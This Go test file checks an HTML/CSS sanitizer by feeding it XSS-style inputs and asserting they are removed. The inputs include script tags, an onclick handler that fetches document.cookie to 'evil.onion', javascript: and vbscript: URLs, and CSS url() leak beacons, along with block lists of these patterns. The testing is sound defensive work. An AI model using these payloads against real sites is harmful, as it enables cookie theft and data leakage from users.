package sanitize

import (
	"strings"
	"testing"
)

func TestHTMLStripsScripts(t *testing.T) {
	in := `<html><head><script>alert(document.cookie)</script></head><body>
<p>hello<script src="http://evil.onion/x.js"></script> world</p>
</body></html>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "alert") || strings.Contains(out, "<script") {
		t.Fatalf("script payload survived:\n%s", out)
	}
	if !strings.Contains(out, "hello") || !strings.Contains(out, "world") {
		t.Fatalf("legit text lost:\n%s", out)
	}
}

func TestHTMLStripsEventHandlers(t *testing.T) {
	in := `<div onclick="fetch('http://evil.onion/'+document.cookie)" onload="steal()"
		onerror="(function(){})()" class="ok">click me</div>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"onclick", "onload", "onerror", "fetch(", "steal("} {
		if strings.Contains(out, bad) {
			t.Fatalf("event handler %q survived:\n%s", bad, out)
		}
	}
	if !strings.Contains(out, "class=\"ok\"") {
		t.Fatalf("safe attribute lost: %s", out)
	}
	if !strings.Contains(out, "click me") {
		t.Fatal("text lost")
	}
}

func TestHTMLDropsDangerousSubtree(t *testing.T) {
	in := `<div><iframe src="http://evil.onion/"></iframe><object data="x"></object>
	<svg onload="alert(1)"><use href="#x"/></svg><form action="http://e/"></form>
	<audio src="s"></audio><video><source src="v"></video>
	<style>body{background:url(http://evil.onion/)}</style></div>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"iframe", "object", "<svg", "<svg", "form", "audio", "video", "<style", "onload", "href="} {
		if strings.Contains(out, bad) {
			t.Fatalf("dangerous element %q survived:\n%s", bad, out)
		}
	}
}

func TestHTMLStripsHrefSrcAndScriptingURLs(t *testing.T) {
	in := `<a href="http://evil.onion/x">link</a>
	<img src="http://evil.onion/i.jpg" onerror="alert(1)">
	<a href="javascript:alert(1)">js</a>
	<a href="vbscript:msgbox(1)">vb</a>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"href=", "src=", "javascript:", "vbscript:", "alert(1)"} {
		if strings.Contains(out, bad) {
			t.Fatalf("scripting URL %q survived:\n%s", bad, out)
		}
	}
}

func TestHTMLSanitizesStyleAttribute(t *testing.T) {
	in := `<p style="color: red; background: url(http://evil.onion/px.gif); position: fixed; -moz-binding: url(x); width: 100%">styled</p>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "color: red") {
		t.Fatalf("safe css lost: %s", out)
	}
	if strings.Contains(out, "url(") || strings.Contains(out, "position") || strings.Contains(out, "-moz-binding") {
		t.Fatalf("unsafe css survived:\n%s", out)
	}
}

func TestHTMLUnknownElementsAreTransparent(t *testing.T) {
	in := `<div><cool-tag>inner text</cool-tag><other style="color:blue">more</other></div>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "cool-tag") || strings.Contains(out, "other") {
		t.Fatalf("unknown element not unwrapped: %s", out)
	}
	if !strings.Contains(out, "inner text") || !strings.Contains(out, "more") {
		t.Fatalf("text of unknown element lost: %s", out)
	}
}

func TestHTMLStripsCommentsAndNoScript(t *testing.T) {
	in := `<div><!-- secret comment --><p>visible</p><noscript><img src="http://x/"></noscript></div>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "secret comment") || strings.Contains(out, "noscript") {
		t.Fatalf("comment/noscript survived:\n%s", out)
	}
}

func TestHTMLAlwaysWellFormed(t *testing.T) {
	out, err := HTML(`<p>just some text</p>`)
	if err != nil {
		t.Fatal(err)
	}
	for _, tag := range []string{"<html", "<head", "<body"} {
		if !strings.Contains(out, tag) {
			t.Fatalf("missing %s skeleton:\n%s", tag, out)
		}
	}
}

func TestHTMLInputSizeCap(t *testing.T) {
	_, err := HTML(strings.Repeat("a", MaxInputBytes+1))
	if err == nil {
		t.Fatal("expected size-cap error")
	}
}

func TestCSSAllowsCosmetics(t *testing.T) {
	in := "color: red; font-weight: bold; margin: 10px; text-align: center"
	out := CSS(in)
	if !strings.Contains(out, "color: red") {
		t.Fatalf("lost safe prop: %s", out)
	}
}

func TestCSSBlocksFetchAndScript(t *testing.T) {
	cases := []string{
		"background-image: url(http://evil.onion/px.gif)",
		"cursor: url(x); color: red",
		"background: image-set('http://e/a' 1x)",
		"width: expression(document.body.clientWidth)",
		"behavior: url(#x)",
		"list-style: url(http://e/)",
		"content: url(http://e/leak)",
		"background: -moz-element(#x)",
	}
	for _, c := range cases {
		out := CSS(c)
		if strings.Contains(out, "url(") || strings.Contains(out, "expression") ||
			strings.Contains(out, "image-set") || strings.Contains(out, "behavior") {
			t.Fatalf("unsafe css survived %q -> %q", c, out)
		}
	}
}

func TestCSSDropsUnknownAndPosition(t *testing.T) {
	out := CSS("position: fixed; top: 0; animation: x")
	if strings.Contains(out, "position") || strings.Contains(out, "animation") {
		t.Fatalf("disallowed prop survived: %s", out)
	}
}

func TestHTMLNoForeignNamespace(t *testing.T) {
	in := `<svg><use xlink:href="#id"/></svg><div color="red">x</div>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "svg") || strings.Contains(out, "xlink") {
		t.Fatalf("foreign namespace survived:\n%s", out)
	}
}

func TestHTMLNumericGeometry(t *testing.T) {
	in := `<table><tr><td width="100" colspan="2">a</td></tr></table>`
	out, err := HTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "width=\"100\"") || !strings.Contains(out, "colspan=\"2\"") {
		t.Fatalf("numeric attrs lost:\n%s", out)
	}
	bad := `<td width="100px;alert(1)" height="abc">x</td>`
	out2, err := HTML(bad)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out2, "width=") || strings.Contains(out2, "height=") {
		t.Fatalf("non-numeric geometry survived:\n%s", out2)
	}
}